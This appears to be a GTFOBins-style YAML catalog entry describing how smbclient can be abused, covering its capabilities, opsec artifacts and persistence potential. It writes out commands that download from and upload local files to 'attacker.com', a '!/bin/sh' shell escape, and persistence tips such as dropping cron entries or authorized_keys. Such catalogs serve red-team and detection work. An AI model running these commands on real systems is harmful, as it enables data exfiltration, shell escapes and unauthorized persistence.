---
name: smbclient
capabilities:
- exec
- spawn
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    smbclient '\\host\share'
    !/bin/sh
  notes: A valid SMB/CIFS server must be available.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
references:
- https://gtfobins.github.io/gtfobins/smbclient/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
